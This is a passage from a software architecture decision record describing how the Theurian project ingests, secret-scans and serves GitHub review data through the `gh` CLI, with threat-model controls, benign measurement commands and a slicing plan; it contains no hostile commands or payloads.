Theurian itself writes: the `SourceAnchor` (FR-S3) that names the upstream object,
and the stamp decision 3 relies on to say a record survived a refetch. They are
neither provider structure nor author content, and calling them either would put
Theurian's own writes on the wrong side of a trust boundary — so they are their
own row, scanned by nothing because nothing outside this process authored them.

**Author-controlled *structural-looking* metadata is on the untrusted side, and
that is the row most easily got wrong.** A label, a branch name and a milestone
name look like provider structure and are not: anyone who can open a pull request
chooses them, so they carry text a person wrote and ride under the same safety
triple as a comment body.

**This is where [ADR-0019](0019-front-matter-is-data-not-governance.md) is
discharged rather than merely cited: an ingested label is data, and it governs
nothing.** A record labelled `security` upstream is not thereby security-related
to Theurian; no serving decision, no refusal and no ranking reads a label's value.
The marking that *would* carry weight — `securityRelated` — is
[#575](https://github.com/theurian/theurian/issues/575)'s, and it is computed at
ingestion from advisory state, never read off an author-chosen label. A design
that let a label decide what is withheld would hand the withholding decision to
whoever opened the pull request.

### 4. The secret scan runs at ingestion, per record, like `propose accept`

`security.secretScan` (SEC-11) applies **at ingestion, per record, before a
record becomes a file**:

| Policy | Behaviour at review ingestion |
| :-- | :-- |
| `block` (default) | the flagged record is **refused and never written**; the run reports the refusal by record identity and does not exit as if it were clean |
| `warn` | the record lands and every finding is reported |
| `off` | no scan |

**This mirrors `propose accept`, not `index build`, and the reason is the source's
own premise.** `application/index_secret_scan.py` states why the *build* records
rather than refuses:

> A landed secret is readable through `knowledge.search` and `knowledge.get` the
> moment `theurian migrate apply` writes it, before any index exists at all …
> So a build that refused to publish would deny *ranking* without un-disclosing
> anything, and on a project that has never built one it would deny ranking for
> ever.

That premise is false pre-landing. Review ingestion runs **before** the content
exists anywhere in Theurian, so refusing genuinely un-discloses **relative to
Theurian's own surfaces**: nothing is written, so nothing is served, indexed,
ranked or reachable through any tool. The gate that matches is ADR-0027's —
validate before you move.

**What `block` costs, stated rather than assumed.** Refusal is not free, and the
cost is not symmetric with the build's. Upstream may already have edited or
deleted the comment by the next run (decision 2's retention residual, in the other
direction), so a record refused at ingestion — including on a **false positive**,
and the detector is best-effort entropy heuristics by its own admission — may be
evidence Theurian never gets another chance to hold. That is accepted, with the
reason named: **a landed credential is worse than a gap in the evidence.** A gap
is visible in the ingest report and recoverable by re-running with `warn` after a
human has looked; a landed secret is a disclosure through every serving surface
the moment it is written, and no later policy change un-writes it. Operators who
weigh those differently have `warn`, which is why the policy is a setting and not
a constant.

The report names the *record* (repository, PR number, thread and comment id), not
the matched bytes, for the reason `index_secret_scan.py` gives about pasted
reports: a report that quotes the secret is a second copy of it.

**The consult disagreed here, and the disagreement is recorded rather than
smoothed over.** The Codex reader recommended the `index build` signal-mode shape
(land and report, never refuse), reasoning by analogy with the existing
scan-at-build control. The watchdog reader checked the *premise* of that control
rather than its shape and found it did not transfer — the "already disclosed"
condition is exactly what ingestion does not have. The premise check won, and the
analogy lost. It is noted here so a future reader who rediscovers the analogy
finds the answer instead of re-deciding it.

### 5. The domain model bends to what GitHub can answer

The `ReviewResolution` model as built requires two fields GitHub does not
guarantee. Four rows below, of which **two change** — the fourth,
`PromotionGate.ci_successful`, is listed precisely because Milestone 8 does *not*
touch it. Slice 1 work:

| Field | Today | Becomes | Why |
| :-- | :-- | :-- | :-- |
| `resolved_at` | `datetime` (required) | `datetime \| None` | **No resolution timestamp exists on the API object.** |
| `resolved_by` | `ReviewParticipant` (required) | `ReviewParticipant \| None` | `resolvedBy` is nullable — a thread can be resolved with no participant recorded. |
| `ReviewEvent.ci_successful` | `bool \| None` (`domain/review.py:61`) | unchanged | `None` already means *unknown*, and that is the honest value for a PR with no status rollup. |
| `PromotionGate.ci_successful` | required `bool` (`domain/review.py:152`) | **not touched by Milestone 8** | The gate is candidate-generation machinery, which is out of scope (below). `None` is unrepresentable there today, so *how the gate should treat unknown* is a real open question — assigned to the candidate-generation design, not answered here. |

**The measurement, quoted from the design consult (2026-09-05, GraphQL schema
introspection).** `PullRequestReviewThread`'s fields are:

```text
comments  diffSide  id  isCollapsed  isOutdated  isResolved  line
originalLine  originalStartLine  path  pullRequest  repository  resolvedBy
startDiffSide  startLine  subjectType  viewerCanReply  viewerCanResolve
viewerCanUnresolve
```

There is no resolution-timestamp field in that list, and `resolvedBy` is
nullable. A required field the provider cannot fill leaves the adapter only bad
options: fabricate a value — the ingestion time, or the last comment's time — and
every consumer downstream reads as a measurement something nobody measured; or
drop the whole resolution record, losing the resolution state the model exists to
carry. Making the field optional is the change that keeps *unknown* expressible,
which is the thing neither bad option can express.

**This is a breaking change to the domain model, and it costs nothing today.**
Measured 2026-09-05 against `origin/main` @ `1fe3302b`, with the population key
being *every occurrence of the symbol anywhere in the shipped package*:

```console
$ git grep -n "ReviewResolution" -- packages/theurian-core/src
packages/theurian-core/src/theurian/domain/review.py:98:class ReviewResolution:
packages/theurian-core/src/theurian/domain/review.py:121:    resolution: ReviewResolution | None = None
```

Two hits, both inside the defining module — the class statement and its own field
on `ReviewThread`. There is no consumer to migrate. The CHANGELOG entry for slice
1 still names it as a breaking change with the old shape and the new one, because
"no consumer exists" answers the migration cost and not the question of whether
the record is honest.

**`ReviewEvent.ci_successful`'s mapping is a rule, not a measured enum.** The
adapter maps the PR's status rollup to the tri-state as: a definite success →
`True`; a definite failure or error → `False`; **anything else — pending,
expected, absent, or a value this version of the adapter does not recognise — →
`None`.** The mapping is stated by semantics rather than by enumerating the API's
enum members, because this ADR did not measure that enum; slice 1 pins the member
list against the schema at implementation time. The load-bearing half is the
default: on the ingested record, an unrecognised value becomes *unknown*, never
*failed*.

**That is a statement about the ingested record and not about the gate.**
`PromotionGate.ci_successful` is a required `bool`, and `is_satisfied` / `unmet()`
read it as a verdict — so an unknown handed to *that* type has already been
flattened into `True` or `False` by whoever constructed it. Milestone 8 constructs
no gate (candidate generation is out of scope), which is why this ADR does not
change the type and does not claim the gate is safe from a shrug. Deciding whether
the gate gains a tri-state, refuses construction on unknown, or treats unknown as
unmet is the candidate-generation design's, and it is listed in *What this does
not close*.

**Candidate generation is out of Milestone 8.** FR-V2 classification and FR-V3
`KnowledgeCandidate` generation are the write-path half of Phase B: they are
SEC-12-gated, and they raise the model question ([ADR-0009](0009-no-llm-vendor-lock-in.md))
that ingestion does not. They are filed and sequenced, not folded in. **FR-V5 is
satisfied structurally rather than by a fallback path: no model exists anywhere in
the ingest path**, so raw ingestion cannot be broken by candidate generation
failing.

That sentence is a universal, and its authority is a test that does not exist yet,
so it is named here as owed rather than left standing on a reading: **slice 2 owes
a walk of the ingest path's modules asserting that none reaches an embedding,
summarization or reranking provider.** The shape to follow is
`test_no_registered_tool_can_reach_a_canonical_write`
(`tests/integration/test_mcp_tools.py:2357`), which walks the **built object
graph** — the registered callables, their `__wrapped__` chains and nested code
objects — rather than a directory of source files, for ADR-0013's equivalent
claim. **What that buys, stated honestly:** it sees what the running system
actually holds, including a path no test exercises. What it does **not** buy is
factory resolution — `co_names` is a name scan one level down, so a provider
obtained through a factory or `getattr` is invisible to it, as round two
demonstrated. The owed test is therefore scoped to what it can hold: no ingest
module *names* a provider module or constructor, plus a runtime assertion over the
built ingest pipeline's object graph. Until it lands, "no model exists anywhere in
the ingest path" is design intent with a named owner, not a measured property —
and even once it lands, a factory-resolved provider is outside its reach.

### 6. Serving is `review.search`, under the SEC-15 triple, with its own disclosure round

The serving surface is **`review.search`**, taken from the already-published
planned table in `docs/protocol/mcp-tools.md` (7 `review.*` rows — the grep and
its output are in *Compliance*). No eighth name is invented: a tool name is a wire
contract, and the table has been publishing this one as planned.

**Every body-derived field is untrusted content (T-3, SEC-15); only structural
fields are validated and normalized.**

**The population is decision 3's field table, not a second list.** Its
*Controlled by* column decides the side: every **author**-controlled field —
comment and review bodies, PR title and description, display name, file path as
received, and the structural-looking metadata (labels, head branch name, milestone
name) — is served under `contentClassification: untrusted-knowledge`,
`mayContainInstructions: true`, `executable: false`. Every **provider**-controlled
field — states, timestamps, line numbers, repository, PR number, ids, commit shas,
CI outcome — is validated and normalized. Enumerating the fields in one place is
what keeps a field from being scanned as content at ingestion and then served as
structure.

The file path is deliberately on the untrusted side: it is chosen by whoever
authored the pull request. It is served as data and **SHALL NOT** be used to build
a filesystem path — the containment SEC-7 requires is not weakened by a string
that arrived over the network, and decision 3 states the same rule for the *write*
path.

**The disclosure closure is its own round, and its test is built with the serving
change.** ADR-0029's closure argument says it in five words — "**new surface owes
its own**" — so `review.search` inherits nothing from `review.findings`' round. The closure form this project uses is one query against two
corpora: an index that **held** withheld rows and an index that **never did** must
return identical responses. Because public-only v1 makes real withheld rows
absent, **the fixture is synthetic** — that is not a weaker test, it is the only
way to have a withheld row at all in a corpus whose scope excludes them, and a
sweep with no withheld row reports its own answer.

Two inherited controls are named so the serve slice does not rediscover them:

- If review evidence is ever served through a **ranked** surface, the withheld-row
  exclusion is a **physical purge** (threat-model T-17a), not a result-set filter:
  a `fusedScore` is priced over FTS5/BM25 collection statistics computed at
  index-build time, which a filter does not clean and a tombstone does not move.
  This is ADR-0029's family-4 third instance, and it applies here unchanged.
- `reviewIngestion: true` (with its scope field, decision 2) flips **at the serve
  slice**, not at ingest, because from that slice the flag means *an ingestion
  call surface exists that a client may call* — the narrowed meaning decision 2
  records, whose six citing sites are rewritten in slice 1, two slices before the
  flip.
- **The triple is bound by import, not by spelling.** A `review.search` payload
  carries `theurian.mcp.results.SAFETY` (`mcp/results.py:44`) splatted into the
  result — imported, never re-typed — so a future edit to the shared constant
  reaches this surface too. A test that asserts three literal key/value pairs
  passes on a payload that re-spells them locally and then drifts; the owed test
  therefore asserts the payload against the imported object, with a companion that
  the assertion can fail.

## Consequences

### Positive

- **T-7's repository allowlist stops being owed and starts running.** The control
  is promised in many places and enforced in none. Measured 2026-09-05 at
  `1fe3302b`, key = the literal phrase, population = the repository minus
  `.claude/`, `docs/work-logs/` and this ADR:
  `git grep -l "repository allowlist" -- . ':!.claude' ':!docs/work-logs' ':!docs/adr/0030-*'`
  → **8 files, 20 lines**. **The key's recorded limit:** it misses the places that
  spell it differently — the schema description ("Not in force. Allowlist of
  `owner/repo` values…"), the `infrastructure/github/` docstring ("Repositories
  must be allowlisted… owed with the adapter rather than in force") and
  `review-knowledge.md` ("the design obligation on the adapter, not current
  behaviour") — so 8 is a floor, not a census. **And T-7 is two entries, not one**:
  `docs/security/threat-model.md:6454` and
  `docs/architecture/requirements-analysis.md:1352` each carry their own T-7 row
  naming the allowlist as owed to #429, so "the T-7 entry" is always plural here
  and slice 1 rewrites **both**. Slice 1 is the first change that can carry the
  control, and both entries are rewritten per control rather than repointed at
  another epic.
- **No new production dependency and no token custody.** The core's runtime
  dependencies are six (`jsonschema`, `pydantic`, `python-ulid`, `pyyaml`,
  `referencing`, `typer` — `packages/theurian-core/pyproject.toml`, measured
  2026-09-05). Spawning `gh` keeps that number, and keeps GitHub credentials in
  the operator's own credential store.
- **The absence control is replaced by something that keeps working after the
  first fetch lands.** "Nothing can reach out" is a sentence with no successor:
  the first time it is false it is retired, and whatever it was protecting is
  unprotected. Ten clauses with their own tests still say something on the day after.
- **Evidence outlives the upstream.** Files-as-source means a deleted upstream
  comment is still in the record, which is the whole point of ingesting review
  history rather than querying it live.
- **The scope is machine-readable.** A client learns "public allowlisted
  repositories only" from `system.capabilities`, not from a paragraph.

### Negative

- **A spawn site is a hole no name-based scan can fully watch.**
  `test_network_call_sites.py` records this itself: a program started under a name
  assembled at runtime survives every structural arm, and a socket watch cannot
  see into another process. After slice 1, "what does `gh` do with the vector we
  hand it" is outside every instrument this suite has.
- **Ingestion inherits the operator's identity and scopes.** The credential that
  runs is not one Theurian issued, bounded, or can revoke.
- **`gh` is an unpinned external binary.** ADR-0014's exact pinning does not reach
  it; a version floor with a test is a weaker instrument than a lockfile, and the
  behaviours clauses 2–6 rely on are that binary's.
- **The evidence files are a new durability obligation.** They are the source, so
  losing them is data loss — which is exactly the property that makes them the
  right place for the data, and exactly the property that means a project must
  treat the directory as content rather than as scratch.
- **A second serving surface means a second disclosure round.** `review.search`
  inherits nothing from `review.findings`' round, and its two-corpora fixture has
  to be built rather than borrowed.

### Neutral

- The **git-native arm (ADR-0029) is untouched.** `review.findings` keeps serving
  trailers from local history and keeps needing no allowlist; the two arms share
  the safety triple and the FR-V family, not a source.
- **`.theurian/review/` is not automatically committed.** The ADR decides only
  that it is not a cache; whether a given project tracks it is that project's
  decision.
- The **five planned `review.*` tools other than `review.search`** stay planned
  (seven rows: one shipped, six planned, of which `review.search` is one). This
  ADR neither builds nor retires them.

## What this does not close

1. **Private-repository ingestion**, and with it the `securityRelated`
   ingestion-time marking plus uniform serve refusal that ADR-0029 assigned to
   this arm. Owned by
   [#575](https://github.com/theurian/theurian/issues/575); not built in
   Milestone 8, and ADR-0029's owed table names #575 rather than this ADR.
2. **FR-V2 classification and FR-V3 `KnowledgeCandidate` generation.** The
   write-path half of Phase B, SEC-12-gated, deliberately sequenced after
   ingestion — and with it **how `PromotionGate` should treat an unknown CI
   outcome**, since its `ci_successful` is a required `bool` today (decision 5).
3. **The other two T-7 controls in their raw-URL form** — the scheme allowlist and
   private-network rejection — stay [#429](https://github.com/theurian/theurian/issues/429)'s
   (see *Dispositions*).
4. **The remaining planned `review.*` tools**: `review.getThread`,
   `review.findSimilar`, `review.getDecisions`,
   `review.generateKnowledgeCandidate`, `review.listUnresolved`.
5. **GitLab and other providers.** The `ReviewProvider` port exists so that a
   second provider is an adapter and not a domain change; this ADR designs one
   adapter and does not claim the port is provider-neutral until a second one
   exists to test that claim.
6. **FR-V6 Markdown views over review evidence.** The requirement scopes them as
   derived artifacts; this ADR neither designs nor forbids them.
7. **What `gh` does after the vector is handed over.** Clause 8's version floor
   bounds *which* binary, not its behaviour; the residual is recorded in decision
   1 and in *Consequences → Negative*.
8. **Propagating an upstream edit or delete into the evidence files.** Decision 2
   records the retention residual and the manual remediation — delete the file,
   rebuild the derived store; a capability that *notices* an upstream deletion and
   acts on it is not designed here.
9. **Headless environment-token authentication.** Excluded from clause 4's
   constant by decision, not by omission: identity comes from the operator's
   persisted `gh` login. Admitting a token variable is a decision with its own
   reasoning, owed to whoever needs it.

## Dispositions this ADR records

Each disposition is a decision with a reason, recorded here so a later session
finds an answer rather than an open question.

**#429 is narrowed, not closed, and exactly one control is discharged.** Slice 1
discharges **one** of T-7's three controls for the `gh` activation context,
**reduces** a second with a residual that stays recorded, and leaves all three
owed in the raw-URL context that is #429's:

| T-7 control | On the `gh` path (slice 1) | In the raw-URL context |
| :-- | :-- | :-- |
| Repository allowlist | **Discharged** — a live check consulted before the spawn, with a pinning test. The only discharged control on this path | n/a |
| Private-network rejection | **Split by family, and neither half is discharged as a whole.** The **proxy family** is closed by construction: it is absent from the child by the equality of clause 4's constant, and run C is what shows it would otherwise move the request. The **config family** is **reduced, not closed**: the config file is *reached* by the child through the three forwarded variables (runs D–F, re-run by round two under exactly the enumerated constant — the request still dialled the unix socket), and slice 1 adds a **pre-spawn best-effort refusal** of known transport-override keys in the file those variables resolve to. **The surviving residual is the TOCTOU race**: a writer racing between the check and the spawn still wins. The check defeats a pre-existing or accidental override, not an attacker with write access and timing | **still #429's** |
| Scheme allowlist | not applicable — there is no URL in the argument vector to check a scheme on (clause 2) | **still #429's** |

**Clause 4's test (ii) is the residual's demonstration and the refusal's driving
test — never "the control that keeps this discharged".** It plants
`http_unix_socket` in a config directory the forwarded variables resolve to and
asserts the spawn is **refused before it happens**; without the refusal, the same
fixture shows the request leaving through the socket, which is the residual made
visible rather than argued about.

#429's activation context is wider than this ADR: it includes the OpenAPI `$ref`
fetcher, where a URL taken from an ingested document is the input, and there both
the scheme allowlist and a destination check are live checks with something to
check. T-7 is therefore rewritten **per control** in slice 1 — the absence control
retired at a named commit, the repository allowlist recorded as discharged with
the test that pins it, private-network rejection recorded as **reduced with a
named residual** (never discharged), and the rest still owed with #429 named. The
threat model's own lesson is the reason this is spelled out — "an owner has to be
the change that would implement the control" — and this entry has had the wrong
owner twice.

**The fetch-absence prose population moves in slice 1, in the same PR as the first
spawn site.** Not a later slice, and not a follow-up: on-main claims must never
call the fetch absent while a fetch path ships. Measured 2026-09-05 against
`origin/main` @ `1fe3302b`, with the key stated so it can be attacked:

```console
$ git grep -l -i -E "reviewIngestion|nothing (here )?can reach out|no external fetch|contacts no repository|never fetche[sd]|first external fetch" -- . ':!.claude' | wc -l
      30
```

The key is a deliberately wide phrase heuristic over six spellings, and it
returns tests, tools and work logs alongside the prose that has to change — the
same discipline `tools/audit/owner_position_cites.py` uses: narrow the population
to what a person must read, then have the person read it. The number is a
*dispatch input*, re-measured when slice 1 is briefed, not a claim about how many
sentences are wrong. This sequencing is binding.

**A second population moves in the same slice, and it needs its own key: the
sentences that attribute this unbuilt work to Milestone 7.** Milestone 7 is closed
and built no fetch path, so every one of them is false today — the two corrected
in `review-knowledge.md` by this PR were members. The key pairs the milestone with
the subject, over shipped source, tests and plugin command documents (CHANGELOGs
are excluded: a dated entry records what was believed when it was written):

**Two subject-filtered keys were tried and both leaked**, in opposite directions —
round one's returned 8 lines across 4 files, an earlier draft of this paragraph
returned 10 across 7, and neither is a superset of the other, so their counts do
not reconcile (8 + 3 ≠ 10 was the arithmetic that gave it away). A subject filter
reads one physical line, and these attributions routinely straddle two. So the
population is taken **unfiltered** and classified by hand — the union of both keys
and then some:

```console
$ git grep -n "Milestone 7" -- packages/theurian-core/src packages/theurian-core/tests \
    plugins/claude-code/commands | wc -l
      27
$ git grep -l "Milestone 7" -- packages/theurian-core/src packages/theurian-core/tests \
    plugins/claude-code/commands | wc -l
      18
```

**27 lines across 18 files** at `origin/main` @ `1fe3302b` (same on this branch — it edits none of them), of which a person judged **12 lines
across 7 files** to be review-ingestion or fetch-control attributions, each moving
in slice 1:

| Line | What it attributes to Milestone 7 |
| :-- | :-- |
| `src/theurian/infrastructure/github/__init__.py:4` | where "the ingestion work will land" |
| `src/theurian/review/__init__.py:6` | the arrival of review ingestion |
| `src/theurian/infrastructure/filesystem/parsers/openapi.py:11` | "the scheme allowlist Milestone 7" — a *fetch control*, not collection |
| `tests/unit/test_network_call_sites.py:8` | "until review ingestion lands (Milestone 7)" |
| `tests/unit/test_network_call_sites.py:34` | "the Milestone 7 review-ingestion adapter" |
| `tests/unit/test_network_call_sites.py:267` | "Milestone 7's *remote* review ingestion" |
| `tests/unit/test_network_call_sites.py:547` | "review ingestion in Milestone 7" |
| `tests/unit/test_network_call_sites.py:606` | "the shape Milestone 7 is most likely to arrive in" |
| `tests/unit/test_network_call_sites.py:658` | "the Milestone 7 `gh api` shape" |
| `tests/unit/test_ref_recording.py:162` | "the Milestone 7 scheme allowlist" |
| `tests/unit/test_config_key_call_sites.py:742` | the byte-pinned plugin sentence, "(Milestone 7)" inside it |
| `plugins/claude-code/commands/ingest.md:32` | "When it lands (Milestone 7)" |

**One member is named and judged *not* to move:**
`tests/unit/test_config_key_call_sites.py:42` — "The Milestone 7 diff that added
the first reader of `.theurian/config.yaml` made this file red". That is a true
statement about a past change (the `secretScan` reader did land in Milestone 7),
so it is history, not an attribution of unbuilt work. It is listed because a
reader re-deriving this population will meet it and needs the verdict rather than
a silent omission.

The remaining 14 lines are Milestone 7 references to the write path, the ports
register and the corpus seed — different subjects entirely. **Slice 1 dispatches
on the union above**, re-measured at brief time; the unfiltered key is what makes
that re-measurement reproducible, at the cost of a hand pass over 27 lines.

**The #368 / #479 boundary, stated so a third owner-position defect cannot
happen.** [#368](https://github.com/theurian/theurian/issues/368) (open, phase-b)
keeps the six git-native findings-store items ADR-0029's owed table assigns it —
including *a ranked-search surface over findings*.
[#479](https://github.com/theurian/theurian/issues/479) (Milestone 8) owns the
GitHub-API arm: events, threads, comments, resolutions. `review.search` serves
**review evidence**, not findings; `review.findings` keeps serving findings. Two
issues, two sources, two tools, no overlap.

**Milestone 8 is a planned epic, so the class-expansion brake does not bind it.**
Four top-row PRs at full synchronous review weight — this ADR, ingest, land,
serve — is the *plan*, not a class that kept producing siblings. A later session
counting PRs in this milestone should read them against the plan, not against the
three-siblings budget.

**Corpus membership: this PR drifts one anchored twin, and the sentence below is
the checker's output rather than an assertion about it.** An earlier draft asked
the wrong question — its key looked for ADR-0025–0029, the threat model and
`review-knowledge.md` among the anchors, and **never asked about the file this PR
edits**. The right key is the anchored `filePath` list intersected with this PR's
own file set:

```console
$ comm -12 <(git grep -h "filePath:" -- '.theurian/migrations/*.yaml' | awk '{print $2}' | sort -u) \
           <(git diff --name-only origin/main...HEAD | sort)
docs/adr/0004-sqlite-is-a-derived-artifact.md
```

One member — the ADR this PR amends. The checker agrees, and its output is the
claim:

```console
$ uv run --frozen python tools/corpus_drift.py
Corpus drift: drifted -- 1 drifted -- compared 26 anchor(s) across 48 committed migration(s); 0 uncheckable; 22 superseded.
  DRIFT  architecture.sqlite-is-a-derived-artifact: docs/adr/0004-sqlite-is-a-derived-artifact.md now hashes to <digest>, and the corpus pins <digest>
```

(The two `contentSha256` prefixes the checker prints are elided as `<digest>`
above, and only there: they are **content hashes, not commits**, and
`tools/audit/sha_anchors.py` reads any 7–40 hex characters in governed prose as a
commit anchor it must resolve. Everything else in that block is the run's exact
output.)

**The re-seed follows this PR's merge, and cannot precede it.** A twin's
`sourceAnchors[].commitSha` must name a commit that holds the body verbatim, and
`test_every_pinned_body_is_byte_identical_to_its_source_anchor_commit` raises on
an anchor "this complete clone does not contain". Measured: all 7 distinct anchor
commits in the corpus today are ancestors of `origin/main`
(`git merge-base --is-ancestor <sha> origin/main` for each, 7/7). The amended
ADR-0004 exists only on this branch, so the only commit that could be anchored is
one a squash-merge discards — which would turn a working test RED on `main` the
moment this lands. So the re-seed is owed to the change that runs **after** the
squash commit exists, by the standing pattern recorded when the seven twins were
re-seeded on 2026-09-05, and **it is owned by
[#579](https://github.com/theurian/theurian/issues/579)** (open; read on
2026-09-05), sequenced as the first work item after this PR merges. Naming the
owner is the point: an owed item described without a number is the stated-absence
shape this ADR corrects twice elsewhere. CI runs the checker `--advisory`, which
is why this drift does not block, and why saying so here is the only thing that
records it.

`tools/corpus_drift.py` walks the committed migrations and compares each anchor to
its live source, so a new `docs/` file with no twin — ADR-0030 itself — is outside
its population by construction, the same way ADR-0025 through ADR-0029 already
are. Stated because every repo-wide claim in this repository declares which side of
the frozen corpus it stands on.

**Dogfood ground: thin, bot-authored and mutable — not absent.** Two
measurements, each with a bounded population, because the first one's window moves
and a moving window cannot be re-checked later:

| Measurement | Population, bounded | Result |
| :-- | :-- | :-- |
| Design consult, 2026-09-05 (`gh api graphql`, `pullRequests(last: 40, states: MERGED)`) | a moving window, bounded by naming the **merge list** it covered rather than a range: the last 40 commits on `origin/main` at `1fe3302b` carry **38** trailing pull-request refs — 440, 446, 448, 460, 466, 467, 470, 471, 474, 475, 478, 482, 486, 487, 488, 489, 490, 492, 498, 500, 501, 504, 513, 514, 518, 519, 524, 525, 534, 536, 541, 545, 552, 554, 556, 557, 560, 563 (`git log origin/main --format='%s' -40 \| sed -n 's/.*(\(#[0-9 #]*\))$/\1/p' \| awk '{print $NF}'`, taking the **trailing** ref per ADR-0029's rule, so `(#520 #525)` contributes 525 and not 520; two of the forty commits carry no ref) | **0** inline review threads, **0** top-level reviews |
| Adversarial review, 2026-09-05 (REST `pulls` / `comments`), re-run by the orchestrator | keyed by PR number, not by a window: **#12, #132, #224, #352, #569** | **11** inline review threads (#352 ×5, #12 ×2, #224 ×2, #132, #569) and **5** `COMMENTED` top-level reviews — every root comment authored by `github-advanced-security[bot]`, one dated 2026-09-05 on the still-open #569 |

**Both figures are dated snapshots, and the thread count moved while this PR was
under review**: a further bot thread landed on the open #569 six minutes after this PR's
round-one fix commit, taking 11 to **12**. The number is therefore written as *11 at the
round-two measurement, 12 shortly after* rather than as a property of the
repository — and the movement is not a nuisance, it is the evidence for the
fixture decision below.

**The second measurement falsifies the universal an earlier draft of this section
drew from the first**, which said this repository "cannot exercise thread
ingestion at all". None of those five PRs is in the merge list above: #12, #132,
#224 and #352 are older than every member, and #569 is not merged at all. The
narrow 0/0 reading was true; the universal was not, and it is withdrawn here
rather than softened.

What remains true is the ground the fixture decision actually rests on: this
project's review rounds happen in agent transcripts and land as commit trailers —
which is why ADR-0029's arm exists — so the native GitHub-side population is
**thin** (11–12 threads across the repository's whole history), **bot-authored**
(every root comment from one scanner), and **mutable** (it grew by one during a
single review round, on an open PR). Dogfooding on this repository is worth doing
and is not a substitute for a controlled corpus. Recorded so that no completion
claim for Milestone 8 overstates what was exercised.

**So the serve slice's real-run verification data source is decided now, not at
slice 3.** Verification runs against a **named disposable public fixture
repository under the theurian org** — for example `review-ingestion-fixture` —
carrying a planted, frozen PR and thread set; it is created when slice 3's
verification needs it, allowlisted **only in the verification configuration**, and
never in a shipped default. The ground is the population above, and its movement
during this very review is the argument: assertions need data that does not
change under them, and the native threads are thin, bot-authored, and demonstrably
live — one arrived mid-round. The rejected alternative is recorded: an external third-party
public repository, rejected for the same reason one step further out, its content
being owned by someone else entirely.

### Slicing plan

| Slice | Contents | Notable ordering |
| :-- | :-- | :-- |
| **1 — ingest** | the allowlist reader **as its own commit** (with the schema-pattern tightening, decision 3); then domain fidelity (decision 5); then the adapter, the ten clause tests, and the document corrections | **The split is justified by a pinned test, not by disjointness** — see the note below, which measures the overlap the earlier draft assumed away |
| **2 — land** | evidence files under `.theurian/review/`, the ingestion-time secret-scan gate, the CLI entry point | The CLI verb is slice 2's to choose; naming one here would assert a command that does not exist |
| **3 — serve** | the SQLite serving store, `review.search`, its wire schema, the capability flag and scope field, and the T-7 / roadmap / `mcp-tools.md` updates that follow from serving | The disclosure round and the two-corpora fixture belong to this slice |

**Why the allowlist reader is its own commit — the real reason, measured.** An
earlier draft said the two commits touch different file sets. **They do not**: of
the 15 files naming `providers.review.repositories`, **11 are also in the
fetch-absence population** at `1fe3302b` (12 on this branch, the twelfth being this
ADR, which is a member of both populations it measures):

```console
$ comm -12 <(git grep -l -i -E "reviewIngestion|nothing (here )?can reach out|no external fetch|contacts no repository|never fetche[sd]|first external fetch" -- . ':!.claude' | sort) \
           <(git grep -l 'providers\.review\.repositories' -- . ':!.claude' | sort) | wc -l
      12
```

The justification is a **pinned test**, not disjointness:
`tests/unit/test_config_key_call_sites.py` asserts by equality that **nothing
reads the key**, so the reader's commit is the one that must flip that pin and
rewrite the sentences resting on it. Bundling it with the adapter would put two
independently-revertable claim flips in one commit. Because the file sets overlap,
the two commits are **sequenced serially in one worktree**, never fanned out.

## Alternatives considered

| Alternative | Why rejected |
| :-- | :-- |
| **An in-process HTTP client (`httpx` plus a token from the environment)** | Three costs at once. It adds a production dependency to a core whose runtime dependency list is six packages, none of them an HTTP client. It puts **token custody** inside Theurian — reading, holding and possibly logging a credential the operator currently keeps in their own credential store. And it creates a **raw-URL surface**, which makes all three of SEC-10's controls live checks that must be built and kept correct. The `gh api graphql` form does not make the SSRF class disappear — run C and runs D–F show the destination moving under a pinned hostname — it removes the *input* those two checks read: there is no URL in the argument vector to apply a scheme allowlist to, and the private-network reach is **reduced** by constructing the environment (clause 4) rather than by inspecting a destination, **with the config-family residual recorded** (the forwarded variables still resolve a config file, and the TOCTOU race survives slice 1's pre-spawn refusal). The `gh` spawn trades a process boundary for that, and buys a smaller reduction than an earlier draft of this row claimed. |
| **Inherit the parent environment and scrub the dangerous variables** | A scrub is a blocklist over a set the adapter does not control. Run C measured that `HTTPS_PROXY` moves the request even with `--hostname` pinned, so the blocklist would have to be complete over destination variables, proxy variables, and whatever the next `gh` release reads. Constructing the environment inverts the burden onto a set this project chooses and pins. |
| **`gh api --paginate`** | Whatever the flag follows, the *response* chooses it rather than the adapter — and this design pins no version-specific semantics for it (clause 8 bounds the binary's version, not its behaviour). Excluding the flag is cheaper than characterising it: a GraphQL cursor is an opaque string in a typed variable, so the adapter still decides every destination it reaches. |
| **`gh api repos/{owner}/{repo}/pulls/...` (the REST path form)** | Repository identity would travel in the URL position, where it is string-interpolated into a path. The GraphQL form carries the same identity as typed variables with no path to escape into, which is what makes clause 2 a checkable property rather than a promise about quoting. |
| **Keep the review data under `.theurian/cache/`, as `review-knowledge.md` said before this change** | Upstream review comments are editable and deletable, so a discarded cache entry for a deleted comment is unrecoverable. Calling that a cache asserts a rebuild property GitHub does not provide. |
| **Scan for secrets at index-build time only, in `index build`'s signal mode (land and report, never refuse)** | This was the Codex reader's recommendation, and it was rejected on the source's own premise: `index_secret_scan.py` records rather than refuses because its content is *already in the canonical store and already served*, so refusal "would deny ranking without un-disclosing anything". Pre-landing, refusal genuinely un-discloses — nothing has been written and nothing served — so the `propose accept` gate is the matching one. |
| **Make `resolved_at` required and fill it with the ingestion time or the last comment's time** | The API object carries no resolution timestamp (decision 5's introspection). A required field filled by the adapter is a fabricated measurement that every downstream consumer reads as real. `None` is the honest value for a quantity the provider does not record. |
| **Invent a new tool name for review-evidence search** | `review.search` has been published as planned in `docs/protocol/mcp-tools.md` since before this design. A tool name is a wire contract; adding an eighth name would leave a published one orphaned and make clients choose between them. |
| **Verify the serve slice against an external third-party public repository** | Its content can change or vanish under the assertions, so the harness's ground truth would be owned by someone else. A disposable fixture repository under this project's own org is frozen by construction. |
| **Ingest private repositories in v1, gated by the allowlist alone** | The allowlist decides *which* repository is contacted; it says nothing about whether the material is safe to serve. Private ingestion needs the `securityRelated` marking and the uniform serve refusal ADR-0029 specifies, and building that is a disclosure-class design in its own right — folding it into the first fetch path would ship the transport and the disclosure boundary in one review round. |

## Compliance

**This ADR ships no behaviour, so it has no shipped test to name.** Its
enforcement at design time is the measurements it cites; its enforcement at
implementation time is the tests the slices owe. The names below are the
properties an implementation must pin, not files that exist today — the same
honest split ADR-0029 states for the same reason.

Measured now, and reproducible from this ADR (2026-09-05, `origin/main` @
`1fe3302b`):

